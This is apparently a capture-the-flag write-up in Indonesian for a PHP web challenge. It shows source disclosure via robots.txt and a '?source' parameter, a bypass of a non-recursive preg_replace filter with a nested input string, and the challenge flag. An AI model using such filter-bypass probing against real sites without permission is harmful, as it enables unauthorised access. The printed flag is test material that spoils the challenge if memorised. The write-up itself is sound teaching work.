# Valo Ez 🔫

## Description

well done

http://20.205.238.7:10812

Author: masse#6385

## Hint

- robot 🤖

## Solve

1. Buka route `/robots.txt`. Hasil sebagai berikut:

    ```txt
    Disallow: *
    Source Code: ?source
    ```

2. Lihat source website dengan menambahkan query args `?source`. Hasil sebagai berikut:

    ```php
    <?php ini_set('display_errors', 0); require("flag.php");$uOabXJZcby = $_GET;isset($uOabXJZcby['source']) && highlight_file(__FILE__) && die();$AZdGZTkLND = $uOabXJZcby[base64_decode("YW5pbWVfaXNfYmFl")];$qTDbcfkdvI = base64_decode('aGVsbG90aGVyZWhvb21hbg==');$oupmkQSUdM = preg_replace("/$qTDbcfkdvI/", '', $AZdGZTkLND);$oupmkQSUdM === $qTDbcfkdvI && super_secret_function(); ?>

    <!DOCTYPE HTML>
    <html>

    <head>
      <title>VALORANT</title>
    </head>

    <body>
      <h1 style="color:red;">hallow motherf*cker!!!</h1>
      <img src="https://cyberpost.co/wp-content/uploads/2021/01/Valorant-Cheaters-More-Bans-1024x576.jpg" alt="">
      <br>
      <p>today im very f****ng mad because of valorant banned me for 1 week, well!!!</p>
      <p>so i wanna you hack that f*****g riot</p>
      <small style="text-decoration: line-through;">The CSS is so weird, so I'm lazy to make it</small>

    </body>

    </html>
    ```
  
3. Analisa source code

    - Variable `$uOabXJZcby` adalah alias dari `$_GET`
    - Mengambil nilai `anime_is_bae` (*YW5pbWVfaXNfYmFl*) dari query args
    - Melakukan replace value `hellotherehooman` (*aGVsbG90aGVyZWhvb21hbg==*) dari nilai `anime_is_bae` dengan string kosong menggunakan function `preg_replace()`
    - Mengecek value akhir dari nilai `anime_is_bae` adalah `hellotherehooman`, jika valid akan dipanggil function `super_secret_function()`

4. Exploit

    Function `preg_replace` melakukan replacing secara utuh kata `hellotherehooman`, jadi kita bisa melakukan bypass dengan menggunakan teknik prefix dan suffix yang valid dari kata `hellotherehooman` agar nilai akhirnya tetap menjadi `hellotherehooman`.

    Solver sebagai berikut:

    `<url>?anime_is_bae=hellohellotherehoomantherehooman`


## Flag

*KWCTF{TERIMAKASIH_INFO_VALORANT_MANIA_INVITE_JAV mason#eng}*